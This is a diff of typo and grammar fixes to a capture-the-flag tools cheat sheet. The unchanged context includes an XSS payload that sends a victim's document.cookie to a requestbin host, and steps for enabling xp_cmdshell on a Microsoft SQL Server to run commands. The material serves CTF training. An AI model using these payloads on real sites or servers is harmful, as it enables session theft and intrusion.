@@ -8,7 +8,7 @@ CTF-Katana
 
 This repository, at the time of writing, will just host a listing of tools and commands that may help with CTF challenges. I hope to keep it as a "live document," and ideally it will not die out like the old "tools" page I had made ([https://github.com/USCGA/tools](https://github.com/USCGA/tools)).
 
-Hopefully, at some point I will develop software that will run through a lot of the low-hanging fruit and simple command-line tools, generate a report and have all the output in one place.
+Hopefully, at some point, I will develop software that will run through a lot of the low-hanging fruit and simple command-line tools, generate a report and have all the output in one place.
 
 
 ---------------
@@ -90,7 +90,7 @@ It will prompt you for a password. **If your password fails, the server might be
 mssqlclient.py username@10.10.10.125 -windows-auth
 ```
 
-If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
+If you have access to a Microsoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:
 
 ```
 SQL> enable_xp_cmdshell
@@ -251,7 +251,7 @@ Esoteric Languages
 
 * [Ook!](http://esolangs.org/wiki/ook!)
 
-	A joke language. Recognizable by `.` and `?`, and `!`.
+	A joke language. Recognizable by `.` and `?` and `!`.
 
 ```
 Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
@@ -296,7 +296,7 @@ Steganography
 
 * [Digital Invisible Ink Stego Tool](http://diit.sourceforge.net/)
 
-	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)
+	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24-bit color)
 
 # WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!
 
@@ -337,9 +337,9 @@ Steganography
 
 * Morse Code
 
-	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html). If you need to be case-sensistive or include a bit more stuff like numbers and punctuation, use this code: [https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368](https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368)
+	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html). If you need to be case-sensitive or include a bit more stuff like numbers and punctuation, use this code: [https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368](https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368)
 
-	If you find Morsecode in the "international written form", like "dah-dit-dit-dah" etcetera, you can use this code: [https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51](https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51) ... which was carved out of this resource: [https://morsecode.scphillips.com/morse.html](https://morsecode.scphillips.com/morse.html)
+	If you find Morse code in the "international written form", like "dah-dit-dit-dah" etcetera, you can use this code: [https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51](https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51) ... which was carved out of this resource: [https://morsecode.scphillips.com/morse.html](https://morsecode.scphillips.com/morse.html)
 
 * Whitespace
 
@@ -358,7 +358,7 @@ mplayer -af scaletempo -speed 64 flag.mp3
     ![img/dna_codes.png](img/dna_codes.png)
     ![img/genome_coding.jpg](img/genome-coding.jpg)
 
-* Extract Thumbnail (data is covered in original image)
+* Extract Thumbnail (data is covered in the original image)
 
 	If you have an image where the data you need is covered, try viewing the thumbnail:
 
@@ -372,7 +372,7 @@ exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
 
 * SONIC Visualizer (audio spectrum)
 
-	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__
+	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there are random bleeps and bloops in the sound, try this tactic!__
 
 * [Detect DTMF Tones]
 
@@ -412,7 +412,7 @@ Cryptography
 	[https://cryptii.com](https://cryptii.com) has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigenère Cipher and more.
 * Keyboard Shift
 	
-	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...
+	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see anything that has the shape of a sentence but it looks like nonsense letters and notes some shift left or right, it may be a keyboard shift...
 
 * Bit Shift
 
@@ -420,7 +420,7 @@ Cryptography
 
 * Reversed Text
 
-	Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python] like so:
+	Sometimes a "ciphertext" is just as easy as reversed text. Don't forget to check under this rock! You can reverse a string in [Python] like so:
 
 ```
 "UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT"[::-1]
@@ -428,7 +428,7 @@ Cryptography
 
 * XOR
 
-	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):
+	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps its hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python-like so (you need `pwntools` installed):
 
 	``` python
 	python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
@@ -464,7 +464,7 @@ Cryptography
 
 * Gronsfeld Cipher
 
-	A variant of the Vignere cipher that uses numbers insteads of letters. [http://rumkin.com/tools/cipher/gronsfeld.php](http://rumkin.com/tools/cipher/gronsfeld.php)
+	A variant of the Vignere cipher that uses numbers instead of letters. [http://rumkin.com/tools/cipher/gronsfeld.php](http://rumkin.com/tools/cipher/gronsfeld.php)
 
 * Beaufourt Cipher
 
@@ -517,7 +517,7 @@ Some code for this attack can be found [here](https://github.com/mimoo/RSA-and-L
 
 * RSA: Chinese Remainder Attack
 
-	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)
+	These challenges can be spotted when given  multiple `c` ciphertexts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)
 
 * [LC4]
 
@@ -676,7 +676,7 @@ PDF Files
 
 * `pdfcrack`
 
-	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.
+	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and brute force.
 
 * `pdfimages`
 
@@ -743,11 +743,11 @@ sudo apt install foremost
 
 * [TestDisk]
 
-	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.
+	A command-line tool used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.
 
 * [photorec]
 
-	Another command-line utility that comes with `testdisk`. It is file data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted. 
+	Another command-line utility that comes with `testdisk`. It is file data recovery software designed to recover lost files including video, documents, and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted. 
 
 
 PNG File Forensics
@@ -796,11 +796,11 @@ Web
 
 * `robots.txt`
 
-	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)
+	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be somewhere you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)
 
 * [Edit This Cookie]
 
-	A web browser plug-in that offers an easy interface to modifying [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___
+	A web browser plug-in that offers an easy interface to modify [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___
 
 * Backup pages ( `~` and `.bak` and `.swp` )
 
@@ -808,7 +808,7 @@ Web
 
 * `/admin/`
 
-	This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.
+	This directory is often found by directory scanning brute force tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.
 
 * `/.git/`
 	
@@ -838,7 +838,7 @@ Web
 ```
 <img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
 ```
-* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
+* new useful XSS cheat sheet: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
 * [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)
 
 	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
@@ -904,7 +904,7 @@ We try to display the content of the file /flag :
 
 * [`requestb.in`](https://requestb.in/)
 
-	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.
+	A free tool and online end-point can be used to catch HTTP requests. Typically these are controlled and set by finding an [XSS] vulnerabilty.
 
 * [`hookbin.com`](https://hookbin.com/)
 
@@ -1007,7 +1007,7 @@ Reverse Engineering
 
 * [IDA](https://www.hex-rays.com/products/ida/support/download.shtml)
 
-	It's one of popular debugger and disassembler tool with rich of features, cross platform, multi-processor disassembler.
+	It's one of popular debugger and disassembler tool with rich of features, cross-platform, multi-processor disassembler.
 
 * [radare2](https://github.com/radareorg/radare2)
 
@@ -1092,7 +1092,7 @@ Miscellaneous
 
 * [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
-	Super useful repo that has a payload for basically every sceario
+	Super useful repo that has a payload for basically every scenario
 
 
 * Punchcards(/Punch cards)
@@ -1102,7 +1102,7 @@ Miscellaneous
 
 * GameBoy ROMS
 
-	You have options to run GameBoy ROMs... one is using VisualBoyAdvance, the oher is RetroArch (which is supposedly better):
+	You have options to run GameBoy ROMs... one is using VisualBoyAdvance, the other is RetroArch (which is supposedly better):
 
 ```
 # VisualBoyAdvance
@@ -1146,7 +1146,7 @@ l(DId<j@<?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R<AKZ&-DfTqBG%G
 * [Base65535](https://github.com/qntm/base65536)
 
 
-	Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!
+	Unicode characters encoding. Includes a lot of seemingly random spaces and Chinese characters!
 
 ```
 𤇃𢊻𤄻嶜𤄋𤇁𡊻𤄛𤆬𠲻𤆻𠆜𢮻𤆻ꊌ𢪻𤆻邌𤆻𤊻𤅋𤲥𣾻𤄋𥆸𣊻𤅛ꊌ𤆻𤆱炼綻𤋅𤅴薹𣪻𣊻𣽻𤇆𤚢𣺻赈𤇣綹𤻈𤇣𤾺𤇃悺𢦻𤂻𤅠㢹𣾻𤄛𤆓𤦹𤊻𤄰炜傼𤞻𢊻𣲻𣺻ꉌ邹𡊻𣹫𤅋𤇅𣾻𤇄𓎜𠚻𤊻𢊻𤉛𤅫𤂑𤃃𡉌𤵛𣹛𤁐𢉋𡉻𡡫𤇠𠞗𤇡𡊄𡒌𣼻燉𣼋𦄘炸邹㢸𠞻𠦻𡊻𣈻𡈻𣈛𡈛ꊺ𠆼𤂅𣻆𣫃𤮺𤊻𡉋㽻𣺬𣈛𡈋𤭻𤂲𣈻𤭻𤊼𢈛儛𡈛ᔺ
@@ -1176,7 +1176,7 @@ l(DId<j@<?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R<AKZ&-DfTqBG%G
 
 * 15 Puzzle
 	
-	A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in a random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: [https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/](https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/)
+	A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: [https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/](https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/)
 
 
 * SETUID Binary Methodology
